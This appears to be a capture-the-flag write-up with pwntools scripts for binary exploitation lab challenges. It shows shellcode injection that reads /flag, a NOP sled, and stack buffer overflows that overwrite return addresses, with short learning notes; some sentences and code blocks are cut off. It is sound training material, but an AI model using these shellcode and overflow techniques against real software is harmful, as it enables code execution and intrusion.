props.className: language-python shiki shiki-themes one-light one-dark-pro monokai
props.code:
from pwn import *
context.clear(arch='amd64')
p = process("/challenge/binary-exploitation-basic-shellcode")
sc = shellcraft.amd64.linux.cat('/flag')
# sc = shellcraft.execve(path="/bin/cat", argv=["/flag"])
# sc = shellcraft.sh()
sc = asm(sc)
p.send(sc)
p.interactive()

props.className: language-python shiki shiki-themes one-light one-dark-pro monokai
props.code:
from pwn import *
context.clear(arch='amd64')
p = process("/challenge/binary-exploitation-nopsled-shellcode")
sc = pwnlib.shellcraft.amd64.nop()*0x800+shellcraft.amd64.linux.cat('/flag')
sc = asm(sc)
p.send(sc)
p.interactive()

children.value: The payload from basic shellcode works.

props.className: language-python shiki shiki-themes one-light one-dark-pro monokai
props.code:
from pwn import *
context.clear(arch='amd64')
p = process("/challenge/binary-exploitation-hijack-to-mmap-shellcode-w")
sc = shellcraft.amd64.linux.cat('/flag')
sc = asm(sc)
p.send(sc)
p.sendline()
p.send(b'A'*8*7+p64(0x15870000))
print(p.recvall().decode())

children.value: For the hard version, I've figured out how to make use of IDA's
is just the base pointer location, which saves a lot more time.

props.className: language-python shiki shiki-themes one-light one-dark-pro monokai

children.value: I tried injecting the shell code before the return address, i.e. make the return address jump back, but it didn't work.

props.className: language-python shiki shiki-themes one-light one-dark-pro monokai

children.value: Instead the shell code is injected after the return address.

props.className: language-python shiki shiki-themes one-light one-dark-pro monokai
props.code:
from pwn import *
context.clear(arch='amd64')
p = process("/challenge/binary-exploitation-hijack-to-shellcode-w")
sc = shellcraft.amd64.linux.cat('/flag')+pwnlib.shellcraft.amd64.nop()*3
sc = asm(sc)
payload = b'A'*8*7 + p64(0x00007fffffffce38+8) + sc
p.send(payload)
print(p.recvall().decode())

props.className: language-python shiki shiki-themes one-light one-dark-pro monokai
props.code:
# __int64 buf[2]; // [rsp+20h] [rbp-20h] BYREF
payload = b'A'*(0x20+8) + p64(0x00007fffffffce38+8) + sc

children.value: First time ever using shellcode, never knew it was this fun and easy.
Also learnt how to use IDA better.
